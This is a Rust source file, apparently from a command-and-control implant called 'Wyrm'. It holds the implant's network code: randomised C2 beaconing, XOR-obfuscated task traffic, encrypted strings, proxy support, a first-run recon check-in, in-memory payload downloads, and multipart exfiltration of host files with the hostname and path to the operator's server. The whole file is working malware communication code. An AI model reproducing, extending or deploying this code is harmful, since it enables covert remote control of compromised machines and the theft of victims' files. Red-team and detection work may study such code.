//! Implant communications are handled here.

use std::{fs, mem::take, path::Path};

use crate::{
    utils::{console::CONSOLE_LOG, time_utils::epoch_now},
    wyrm::Wyrm,
};
// use minreq::Response;
use rand::Rng;
use reqwest::{
    Url,
    blocking::{
        ClientBuilder, Response,
        multipart::{Form, Part},
    },
    header::{AUTHORIZATION, CONTENT_TYPE, HeaderMap, USER_AGENT, WWW_AUTHENTICATE},
    redirect::Policy,
};
use shared::{
    net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
    pretty_print::print_failed,
    tasks::{Command, ExfiltratedFile, Task},
};
use str_crypter::{decrypt_string, sc};

/// Constructs the C2 URL by randomly choosing the URI to visit.
pub fn construct_c2_url(implant: &Wyrm) -> String {
    let mut rng = rand::rng();
    let i = rng.random_range(0..implant.c2_config.api_endpoints.len());

    let uri = &implant.c2_config.api_endpoints[i];
    const COLON_SZ: usize = 1;
    const MAX_PORT_SZ: usize = 6;
    const LEEWAY_SLASH_SZ: usize = 1;
    let approx_len =
        implant.c2_config.url.len() + COLON_SZ + MAX_PORT_SZ + uri.len() + LEEWAY_SLASH_SZ;

    let mut s = String::with_capacity(approx_len);

    s.push_str(&implant.c2_config.url);
    s.push(':');
    s.push_str(&implant.c2_config.port.to_string());

    // Ensure we start with a '/' in case the operator is laxy dazy :)
    if !uri.starts_with('/') {
        s.push('/');
    };

    s.push_str(&uri);

    s
}

/// Checks in with the C2 and gets any pending tasks.
pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Error> {
    let formatted_url = construct_c2_url(implant);
    let sec_token = &implant.c2_config.security_token;
    let ua = &implant.c2_config.useragent;
    let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);

    // Drain the console log and put it into a completed task
    {
        let mut log = CONSOLE_LOG.lock().unwrap();
        if !log.is_empty() {
            let drained = take(&mut *log);
            // Note task 1 will always be for console logs as we hardcode this via sql migration when the srv starts up
            // for the first time.
            implant.push_completed_task(
                &Task::from(1, Command::ConsoleMessages, None),
                Some(drained),
            );
        }
    }

    // Make the actual request, depending upon whether we have data to upload or not
    let response = if implant.completed_tasks.is_empty() {
        http_get(formatted_url.clone(), headers, implant)?
    } else {
        http_post_tasks(formatted_url.clone(), implant, headers)?
    };

    let mut tasks: Vec<Task> = vec![];

    // If response was not OK; then just sleep. In the future maybe we have a strategy to exit after x
    // bad requests?
    if response.status().as_u16() != 200 {
        #[cfg(debug_assertions)]
        println!(
            "[-] Status code was not OK 200. Got: {}. URL: {}",
            response.status().as_u16(),
            formatted_url
        );

        tasks.push(Task {
            id: 0,
            command: Command::Sleep,
            metadata: None,
            completed_time: epoch_now(),
        });

        return Ok(tasks);
    }

    let response_bytes = response.bytes().unwrap_or_default();
    Ok(decode_tasks_stream(&response_bytes))
}

fn http_get(url: String, headers: HeaderMap, implant: &Wyrm) -> Result<Response, reqwest::Error> {
    let dest = Url::parse(&url).unwrap();

    let client_builder = reqwest::blocking::ClientBuilder::new();
    let client_builder = implant
        .c2_config
        .apply_proxy_for_c2_url(&url, client_builder)?;

    let client = client_builder.default_headers(headers).build()?;
    client.get(dest).send()
}

fn http_post_tasks(
    url: String,
    implant: &mut Wyrm,
    mut headers: HeaderMap,
) -> Result<Response, reqwest::Error> {
    let client_builder = reqwest::blocking::ClientBuilder::new();
    let client_builder = implant
        .c2_config
        .apply_proxy_for_c2_url(&url, client_builder)?;

    let mut completed_tasks: TasksNetworkStream = Vec::new();

    //
    // For each task that has been completed, we need to encode it properly so that it fits
    // with the standard of:    XOR ENVELOPE([u32 Command][u16 string result]).
    //
    // We can then push this to the completed tasks, which will be serialised itself, and then
    // sending on its merry way to the C2.
    //
    while let Some(task) = implant.completed_tasks.pop() {
        let encoded_byte_response = encode_u16buf_to_u8buf(&task).xor_network_stream();
        completed_tasks.push(encoded_byte_response);
    }

    let serialised_post_body: Vec<u8> =
        serde_json::to_vec(&completed_tasks).expect("could not ser");

    headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());

    let client = client_builder.default_headers(headers).build()?;

    // TODO domain fronting in the above builder?
    client.post(url).body(serialised_post_body).send()
}

/// Generates some generic headers which we send along with the HTTP request to the C2.
/// These are to be the same for GET, POST, etc. Includes:
///
/// - Implant ID
fn generate_generic_headers(implant_id: &str, security_token: &str, ua: &str) -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(WWW_AUTHENTICATE, implant_id.parse().unwrap());
    headers.insert(USER_AGENT, ua.parse().unwrap());
    headers.insert(AUTHORIZATION, security_token.parse().unwrap());

    headers
}

/// Decode a `Response` byte stream from the C2 into a Vec of individual `Task`'s,
///
/// The data coming into this function will be XOR encrypted, as per a hardcoded XOR key
/// shared between both the C2 and the implant. This routine will first decode each
/// inbound packet, and then decode the HTTP response as per the implant's communication
/// scheme.
///
/// # Returns
/// A vector of [`Task`] ready to be dispatched or otherwise available to work with.
pub fn decode_tasks_stream(byte_response: &[u8]) -> Vec<Task> {
    // Parse JSON into the inner binary packets
    let packets: Vec<Vec<u8>> = match serde_json::from_slice(byte_response) {
        Ok(p) => p,
        Err(_) => return vec![],
    };

    // For each packet, undo the XOR and decode header+body
    packets
        .into_iter()
        .map(|pkt| {
            let decrypted = pkt.xor_network_stream();
            decode_http_response(&decrypted)
        })
        .collect()
}

/// Makes a request to the C2 when it's the first time checking in per session, e.g. after reboot or after the agent
/// has for some reason, exit.
///
/// Function pulls configuration settings down, and sends local config up where required for that first check-in.
pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Error> {
    implant.conduct_first_run_recon();

    //
    // make the request
    //

    let formatted_url = construct_c2_url(implant);
    let sec_token = &implant.c2_config.security_token;
    let ua = &implant.c2_config.useragent;
    let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);
    let response = http_post_tasks(formatted_url.clone(), implant, headers)?;

    //
    // We get back some settings from the C2
    //
    let mut tasks: Vec<Task> = vec![];

    if response.status().as_u16() != 200 {
        #[cfg(debug_assertions)]
        println!(
            "[-] Status code was not OK 200. Got: {}. Sent to: {}",
            response.status().as_u16(),
            formatted_url,
        );

        tasks.push(Task {
            id: 0,
            command: Command::AgentsFirstSessionBeacon,
            metadata: None,
            completed_time: epoch_now(),
        });

        return Ok(tasks);
    }

    Ok(decode_tasks_stream(&response.bytes().unwrap_or_default()))
}

/// Downloads a file to a buffer in memory
///
/// # Note
/// As this function downloads a file **in memory**, ensure you are not downloading something massive with this
/// as it will cause the device to run OOM. If that functionality is necessary, then make a streaming function which
/// downloads to a file over a stream.
pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, reqwest::Error> {
    let formatted_url = format!("{}:{}{}", wyrm.c2_config.url, wyrm.c2_config.port, uri);
    let sec_token = &wyrm.c2_config.security_token;
    let ua = &wyrm.c2_config.useragent;
    let headers = generate_generic_headers(&wyrm.implant_id, sec_token, ua);

    let response = http_get(formatted_url, headers, wyrm)?;

    Ok(response.bytes().unwrap_or_default().to_vec())
}

pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
    let Ok(file) = fs::File::open(&ef.file_path) else {
        print_failed(format!(
            "{} {}",
            sc!("Could not open file.", 96).unwrap(),
            ef.file_path,
        ));
        return;
    };
    let len = match file.metadata() {
        Ok(f) => f.len(),
        Err(e) => {
            print_failed(format!(
                "{}. {e}",
                sc!("Failed to get file len.", 85).unwrap()
            ));
            return;
        }
    };

    let Ok(part) = Part::reader_with_length(file, len)
        .file_name(
            Path::new(&ef.file_path)
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .into_owned(),
        )
        .mime_str("application/octet-stream")
    else {
        print_failed(format!("{}", sc!("Could not construct part.", 74).unwrap()));
        return;
    };

    let form = Form::new()
        .text(sc!("hostname", 47).unwrap(), ef.hostname.clone())
        .text(sc!("source_path", 98).unwrap(), ef.file_path.clone())
        .part(sc!("file", 92).unwrap(), part);

    let url = construct_c2_url(implant);
    let headers = generate_generic_headers(
        &implant.implant_id,
        &implant.c2_config.security_token,
        &implant.c2_config.useragent,
    );
    let cb = ClientBuilder::new();
    let Ok(cb) = implant.c2_config.apply_proxy_for_c2_url(&url, cb) else {
        print_failed(format!(
            "{}",
            sc!("Failed to look for proxy during upload.", 63).unwrap()
        ));
        return;
    };

    let client = cb
        .default_headers(headers)
        .redirect(Policy::none())
        .timeout(None)
        .build()
        .unwrap();

    if let Err(e) = client.post(url).multipart(form).send() {
        print_failed(format!(
            "{} {e}",
            sc!("Could not send file to C2.", 72).unwrap()
        ));
    };
}
